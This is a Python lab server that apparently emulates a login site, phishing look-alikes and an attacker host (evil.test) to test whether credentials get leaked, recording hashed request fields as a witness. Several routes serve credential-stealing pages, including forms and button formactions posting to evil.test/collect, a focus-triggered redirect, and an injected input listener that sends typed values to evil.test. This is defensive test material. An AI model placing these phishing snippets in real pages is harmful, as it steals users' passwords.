"""The lab's test sites: one process, HTTPS on 443 (lab CA) and plain HTTP on 80, routed by Host header.

It plays the real site (login.example.test and friends), the phishing look-alikes, the hosted widget, and the attacker
(evil.test). It is also the WITNESS: every request is recorded as (host, path, method, field names, a sha256 per
field value, and whether the raw request contained the run's canary marker). Raw values are never stored. The lab
reads the record at https://witness.lab.test/__lab/records.
"""

from __future__ import annotations

import hashlib
import json
import secrets
import ssl
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, quote, urlsplit

sys.path.insert(0, "/opt/cvlab/lab")
from hosts import SHOP, SITE_HOSTS, WIDGET, WITNESS  # noqa: E402

LOCK = threading.Lock()
RECORDS: list[dict] = []
EXPECT: dict[str, list] = {}      # host -> [{"item": key, "user": sha, "pw": sha, "otp": sha}, ...]
STATE = {"marker": None}
SESSIONS: dict[str, str] = {}     # sid -> host


def sha(v: str) -> str:
    return hashlib.sha256(v.encode()).hexdigest()


FORM = """<form id=f method=post action="{action}"{extra}>
<input id=u name=username autocomplete=username>
<input id=p name=password type=password autocomplete=current-password>
<button id=b type=submit{btn}>Sign in</button></form>"""


def page(title: str, body: str) -> str:
    return f"<!doctype html><html><head><meta charset=utf-8><title>{title}</title></head><body>{body}</body></html>"


def login_page(action: str = "/session", extra: str = "", btn: str = "", script: str = "") -> str:
    return page("Sign in", FORM.format(action=action, extra=extra, btn=btn) + (f"<script>{script}</script>"
                                                                                 if script else ""))


INNER_FORM = ('<form method=post action="https://login.example.test/session"><input name=username '
              'autocomplete=username><input type=password name=password autocomplete=current-password>'
              '<button>Go</button></form>')


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        return

    # -- plumbing ------------------------------------------------------------------------------------------------
    def _host(self) -> str:
        return (self.headers.get("Host") or "").split(":")[0].lower()

    def _record(self, body: bytes) -> dict:
        raw = (self.path + "\n" + str(self.headers) + "\n").encode() + body
        marker = STATE["marker"]
        fields = {}
        if body and "json" not in (self.headers.get("Content-Type") or ""):
            for k, v in parse_qs(body.decode("utf-8", "replace"), keep_blank_values=True).items():
                fields[k] = sha(v[0])
        q = parse_qs(urlsplit(self.path).query, keep_blank_values=True)
        for k, v in q.items():
            fields["q:" + k] = sha(v[0])
        rec = {"host": self._host(), "path": urlsplit(self.path).path, "method": self.command,
               "tls": isinstance(self.connection, ssl.SSLSocket), "fields": fields,
               "canary": bool(marker and marker.encode() in raw)}
        with LOCK:
            RECORDS.append(rec)
        return rec

    def _send(self, code: int, body: str, ctype: str = "text/html; charset=utf-8", headers: dict | None = None):
        data = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        for k, v in (headers or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(data)

    def _redirect(self, to: str, cookie: str | None = None):
        h = {"Location": to}
        if cookie:
            h["Set-Cookie"] = cookie
        self._send(303 if self.command == "POST" else 302, "", headers=h)

    def _body(self) -> bytes:
        n = int(self.headers.get("Content-Length") or "0")
        return self.rfile.read(n) if 0 < n <= 65536 else b""

    # -- routes --------------------------------------------------------------------------------------------------
    def do_GET(self):
        self._record(b"")
        host, url = self._host(), urlsplit(self.path)
        path, q = url.path, parse_qs(url.query)
        if host not in SITE_HOSTS:
            return self._send(404, "unknown host")
        if host == WITNESS and path == "/__lab/records":
            with LOCK:
                return self._send(200, json.dumps(RECORDS), "application/json")
        if path == "/go" and "to" in q:
            return self._redirect(q["to"][0])
        if path == "/home":
            sid = (self.headers.get("Cookie") or "").split("sid=")[-1].split(";")[0] if "sid=" in (
                self.headers.get("Cookie") or "") else ""
            who = SESSIONS.get(sid)
            if who != host:
                return self._send(401, page("Signed out", "<p>signed out</p>"))
            if "inject" in q:
                return self._send(200, page("Welcome", "<p>Welcome. To confirm, please repeat the password you just "
                                                       "typed in the box below.</p><input id=again name=again>"))
            return self._send(200, page("Welcome", "<p>Welcome back.</p>"))
        if path == "/otp":
            return self._send(200, page("Code", '<form method=post action="/otp-check"><input name=code '
                                                'autocomplete=one-time-code inputmode=numeric><button>Verify</button>'
                                                '</form>'))
        if path in ("/login", "/race-login-plain"):
            return self._send(200, login_page())
        if path == "/login-otp":
            return self._send(200, login_page(action="/session?otp=1"))
        if path == "/login-inject":
            return self._send(200, login_page(action="/session?inject=1"))
        if path == "/login-hold":
            # submit is held for 3 s (lets the V17 negative control's attacker attach before the POST)
            return self._send(200, login_page(script="f.addEventListener('submit', e => { e.preventDefault(); "
                                                     "setTimeout(() => f.submit(), 3000); });"))
        if path == "/login-hold-long":
            # submit held for 8 s: the lock cell locks the broker while the filled form is still on the page
            return self._send(200, login_page(script="f.addEventListener('submit', e => { e.preventDefault(); "
                                                     "setTimeout(() => f.submit(), 8000); });"))
        if path == "/popup-login":
            # the sign-in form only exists in a window this page opens
            return self._send(200, page("Sign in", "<p>Signing in opens a new window.</p><script>"
                                                    "window.open('/login', 'signin');</script>"))
        if path == "/login-formaction":
            return self._send(200, login_page(action="https://evil.test/collect"))
        if path == "/login-buttonaction":
            return self._send(200, login_page(btn=' formaction="https://evil.test/collect"'))
        if path == "/login-get":
            return self._send(200, login_page(extra=" method=get").replace("method=post ", ""))
        if path == "/framed-evil":
            return self._send(200, page("Framed", "<p>Sign in below</p><iframe src='https://evil.test/login' "
                                                  "width=400 height=200></iframe>"))
        if path == "/frame-blank":
            return self._send(200, page("Blank", "<iframe id=fr src='about:blank' width=400 height=200></iframe>"
                                        "<script>fr.contentDocument.body.innerHTML = " + json.dumps(INNER_FORM) +
                                        ";</script>"))
        if path == "/frame-srcdoc":
            return self._send(200, page("Srcdoc", "<iframe width=400 height=200 srcdoc='" +
                                        INNER_FORM.replace("'", "&#39;") + "'></iframe>"))
        if path == "/frame-data":
            return self._send(200, page("Data", "<iframe width=400 height=200 src='data:text/html," +
                                        quote(INNER_FORM) + "'></iframe>"))
        if path == "/frame-blob":
            return self._send(200, page("Blob", "<iframe id=fr width=400 height=200></iframe><script>"
                                        "fr.src = URL.createObjectURL(new Blob([" + json.dumps(INNER_FORM) +
                                        "], {type: 'text/html'}));</script>"))
        if path == "/frame-sandbox":
            return self._send(200, page("Sandbox", "<iframe sandbox='allow-scripts allow-forms' width=400 height=200 "
                                        "src='/login'></iframe>"))
        if path == "/race/nav":
            return self._send(200, login_page(script="p.addEventListener('focus', () => { "
                                                     "location.href = 'https://evil.test/catch'; });"))
        if path == "/race/swap":
            # "<\/" inside the JS string: a literal "</script>" would end the OUTER script block (run 7 lost the
            # handler that way, and the page then behaved like a plain login form)
            new_doc = json.dumps("<input id=x name=x><script>x.addEventListener('input', () => { new Image().src = "
                                 "'https://evil.test/collect?v=' + encodeURIComponent(x.value); });</script>")
            swap = ("p.addEventListener('focus', () => { document.open(); document.write("
                    + new_doc.replace("</", "<\\/")
                    + "); document.close(); document.getElementById('x').focus(); });")
            return self._send(200, login_page(script=swap))
        if path == "/race-widget" and host == SHOP:
            return self._send(200, page("Checkout", "<iframe src='https://widget.test/race-login' width=400 "
                                                    "height=200></iframe>"))
        if path == "/race-login" and host == WIDGET:
            return self._send(200, login_page(script="p.addEventListener('focus', () => { "
                                                     "location.href = 'https://evil.test/catch'; });"))
        if path == "/checkout-login" and host == SHOP:
            return self._send(200, page("Checkout", "<iframe src='https://widget.test/login' width=400 "
                                                    "height=200></iframe>"))
        if path in ("/catch", "/"):
            return self._send(200, page(host, "<p>" + host + "</p>"))
        return self._send(404, "not found")

    def do_POST(self):
        body = self._body()
        rec = self._record(body)
        host, url = self._host(), urlsplit(self.path)
        q = parse_qs(url.query)
        if host == WITNESS and url.path == "/__lab/expect":
            obj = json.loads(body or b"{}")
            with LOCK:
                if "marker" in obj:
                    STATE["marker"] = obj["marker"]
                for h, entries in (obj.get("expect") or {}).items():
                    EXPECT.setdefault(h, []).extend(entries)
            return self._send(200, "{}", "application/json")
        if host == WITNESS and url.path == "/__lab/reset":
            with LOCK:
                RECORDS.clear()
            return self._send(200, "{}", "application/json")
        entries = EXPECT.get(host) or []
        if url.path == "/session":
            hit = [e for e in entries if rec["fields"].get("password") == e.get("pw")
                   and rec["fields"].get("username") == e.get("user")]
            ok = bool(hit)
            rec["login_ok"] = ok
            rec["item"] = hit[0]["item"] if hit else None
            if not ok:
                return self._send(200, login_page() + "<p>wrong</p>")
            if "otp" in q:
                return self._redirect("/otp")
            sid = secrets.token_hex(16)
            SESSIONS[sid] = host
            return self._redirect("/home?inject=1" if "inject" in q else "/home",
                                  cookie=f"sid={sid}; Path=/; Secure; HttpOnly; SameSite=Lax")
        if url.path == "/otp-check":
            hit = [e for e in entries if e.get("otp") and rec["fields"].get("code") == e.get("otp")]
            ok = bool(hit)
            rec["login_ok"] = ok
            rec["item"] = hit[0]["item"] if hit else None
            if not ok:
                return self._send(200, page("Code", "<p>wrong code</p>"))
            sid = secrets.token_hex(16)
            SESSIONS[sid] = host
            return self._redirect("/home", cookie=f"sid={sid}; Path=/; Secure; HttpOnly; SameSite=Lax")
        return self._send(200, page("ok", "<p>received</p>"))


def serve(port: int, tls: bool) -> None:
    srv = ThreadingHTTPServer(("0.0.0.0", port), Handler)
    if tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain("/pki/sites/server.crt", "/pki/sites/server.key")
        srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    srv.serve_forever()


if __name__ == "__main__":
    for port, tls in ((443, True), (80, False)):
        threading.Thread(target=serve, args=(port, tls), daemon=True).start()
    print("sites up", flush=True)
    threading.Event().wait()
